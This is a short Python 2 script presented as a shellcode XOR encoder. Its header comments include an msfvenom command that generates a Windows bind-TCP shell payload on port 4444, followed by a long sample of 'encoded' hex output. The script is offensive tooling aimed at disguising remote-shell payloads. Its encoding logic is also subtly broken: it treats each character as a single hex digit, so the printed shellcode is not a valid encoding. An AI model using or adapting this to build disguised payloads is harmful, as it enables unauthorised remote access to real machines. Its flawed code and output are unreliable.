# Simple Shellcode XOR encoder
# Author:  w4fz5uck5
# msfvenom -p windows/shell/bind_tcp lport=4444 -f raw > shell.bin
# python xor_enc.py shell.bin
# python xor_enc.py s.bin                                                                                                                                                                                   [±master ●]
# HEX:
# 20232127272d2f2f2f2f2f2f292f2726212a2c2e232f292b27242a2f2c2f27242a2d2f2327242a2d2e2b2724282d2d272f2024282b252d292c2e202025232c23292e28232f2d2d232d2f232e23202f222f2e2328212d202d2a2d2a2827242a2d2e2f27242b252c2327242b232e2e2827212c2b272f2e222e2a2e27242a262d2f2f2e222c27242b262e27212c2c252b2627242c2b27242f2e22292c2e20202523232e23202f222f2e23282c27212f282a20292f2c282220272c2428222d2b282a212b2a2727242a272d2b2f2e222c292927242f232b2427242a272e232f2e222c27242f2b27242f2e222f27262b2b2d2b2d2b2a242a24292e2a262a252a2e2020212f2a202a202a2527242e2d212427222a2229272c2c2c2d2f2f2f2f29272828282c2c2d2a202a2b29272b2328282d292f282020222a2427262f2f2e2f2f2f2f2d26232b2a2b2a2f29272d26272f29242f2f2020222a2a2f2a2f2a2f2a2f2b2f2a2f2b2f2a2f292721252f202220212f2020222a262829252f2a2927232f25272f2f292629272f2d2f2f2e2b2e202726212929252e2f2a292a2829272626252a282b292e2020222a272a232f282b2f2320202b212f27282a21232927202f242a252d2a292020222a2927292c2922292b2f2f2726212c2a282a282a282c2e202929252e2d2a262a29212d2022292923282b2b2d2b2c232f2e2f2e27222b2b2d2b2e2f23292f2f2b2b2a2b2a2f2a292a292a292b292a292b212a292a292a2c2a292927282623232c2027292020222a2726212f2b212a292b2920202c2f29272f2727282e22292f2020222a2424202f242a252d2a2929272529262a242226222020222a2c232f2928232f25272f2024212f282a2f2a24242b282e2c282d292029252f2f2a2c2020222a
# ----------------------------------------
# Shellcode format:
# \x20\x23\x21\x27\x27\x2d\x2f\x2f\x2f\x2f\x2f\x2f\x29\x2f\x27\x26\x21\x2a\x2c\x2e\x23\x2f\x29\x2b\x27\x24\x2a\x2f\x2c\x2f\x27\x24\x2a\x2d\x2f\x23\x27\x24\x2a\x2d\x2e\x2b\x27\x24\x28\x2d\x2d\x27\x2f\x20\x24\x28\x2b\x25\x2d\x29\x2c\x2e\x20\x20\x25\x23\x2c\x23\x29\x2e\x28\x23\x2f\x2d\x2d\x23\x2d\x2f\x23\x2e\x23\x20\x2f\x22\x2f\x2e\x23\x28\x21\x2d\x20\x2d\x2a\x2d\x2a\x28\x27\x24\x2a\x2d\x2e\x2f\x27\x24\x2b\x25\x2c\x23\x27\x24\x2b\x23\x2e\x2e\x28\x27\x21\x2c\x2b\x27\x2f\x2e\x22\x2e\x2a\x2e\x27\x24\x2a\x26\x2d\x2f\x2f\x2e\x22\x2c\x27\x24\x2b\x26\x2e\x27\x21\x2c\x2c\x25\x2b\x26\x27\x24\x2c\x2b\x27\x24\x2f\x2e\x22\x29\x2c\x2e\x20\x20\x25\x23\x23\x2e\x23\x20\x2f\x22\x2f\x2e\x23\x28\x2c\x27\x21\x2f\x28\x2a\x20\x29\x2f\x2c\x28\x22\x20\x27\x2c\x24\x28\x22\x2d\x2b\x28\x2a\x21\x2b\x2a\x27\x27\x24\x2a\x27\x2d\x2b\x2f\x2e\x22\x2c\x29\x29\x27\x24\x2f\x23\x2b\x24\x27\x24\x2a\x27\x2e\x23\x2f\x2e\x22\x2c\x27\x24\x2f\x2b\x27\x24\x2f\x2e\x22\x2f\x27\x26\x2b\x2b\x2d\x2b\x2d\x2b\x2a\x24\x2a\x24\x29\x2e\x2a\x26\x2a\x25\x2a\x2e\x20\x20\x21\x2f\x2a\x20\x2a\x20\x2a\x25\x27\x24\x2e\x2d\x21\x24\x27\x22\x2a\x22\x29\x27\x2c\x2c\x2c\x2d\x2f\x2f\x2f\x2f\x29\x27\x28\x28\x28\x2c\x2c\x2d\x2a\x20\x2a\x2b\x29\x27\x2b\x23\x28\x28\x2d\x29\x2f\x28\x20\x20\x22\x2a\x24\x27\x26\x2f\x2f\x2e\x2f\x2f\x2f\x2f\x2d\x26\x23\x2b\x2a\x2b\x2a\x2f\x29\x27\x2d\x26\x27\x2f\x29\x24\x2f\x2f\x20\x20\x22\x2a\x2a\x2f\x2a\x2f\x2a\x2f\x2a\x2f\x2b\x2f\x2a\x2f\x2b\x2f\x2a\x2f\x29\x27\x21\x25\x2f\x20\x22\x20\x21\x2f\x20\x20\x22\x2a\x26\x28\x29\x25\x2f\x2a\x29\x27\x23\x2f\x25\x27\x2f\x2f\x29\x26\x29\x27\x2f\x2d\x2f\x2f\x2e\x2b\x2e\x20\x27\x26\x21\x29\x29\x25\x2e\x2f\x2a\x29\x2a\x28\x29\x27\x26\x26\x25\x2a\x28\x2b\x29\x2e\x20\x20\x22\x2a\x27\x2a\x23\x2f\x28\x2b\x2f\x23\x20\x20\x2b\x21\x2f\x27\x28\x2a\x21\x23\x29\x27\x20\x2f\x24\x2a\x25\x2d\x2a\x29\x20\x20\x22\x2a\x29\x27\x29\x2c\x29\x22\x29\x2b\x2f\x2f\x27\x26\x21\x2c\x2a\x28\x2a\x28\x2a\x28\x2c\x2e\x20\x29\x29\x25\x2e\x2d\x2a\x26\x2a\x29\x21\x2d\x20\x22\x29\x29\x23\x28\x2b\x2b\x2d\x2b\x2c\x23\x2f\x2e\x2f\x2e\x27\x22\x2b\x2b\x2d\x2b\x2e\x2f\x23\x29\x2f\x2f\x2b\x2b\x2a\x2b\x2a\x2f\x2a\x29\x2a\x29\x2a\x29\x2b\x29\x2a\x29\x2b\x21\x2a\x29\x2a\x29\x2a\x2c\x2a\x29\x29\x27\x28\x26\x23\x23\x2c\x20\x27\x29\x20\x20\x22\x2a\x27\x26\x21\x2f\x2b\x21\x2a\x29\x2b\x29\x20\x20\x2c\x2f\x29\x27\x2f\x27\x27\x28\x2e\x22\x29\x2f\x20\x20\x22\x2a\x24\x24\x20\x2f\x24\x2a\x25\x2d\x2a\x29\x29\x27\x25\x29\x26\x2a\x24\x22\x26\x22\x20\x20\x22\x2a\x2c\x23\x2f\x29\x28\x23\x2f\x25\x27\x2f\x20\x24\x21\x2f\x28\x2a\x2f\x2a\x24\x24\x2b\x28\x2e\x2c\x28\x2d\x29\x20\x29\x25\x2f\x2f\x2a\x2c\x20\x20\x22\x2a
# ----------------------------------------
#

import sys
key = 0x2f
shellcodeF = open(sys.argv[1], "r").read()

print "----------------------------------------"
print "HEX:"
print "".join([hex(int(chr(ord(i)), 16) ^ 0x2f)[2::]  for i in shellcodeF])
print "----------------------------------------"
print "Shellcode format:"
print "\\x" + "\\x".join([hex(int(chr(ord(i)), 16) ^ 0x2f)[2::]  for i in shellcodeF])
print "----------------------------------------"
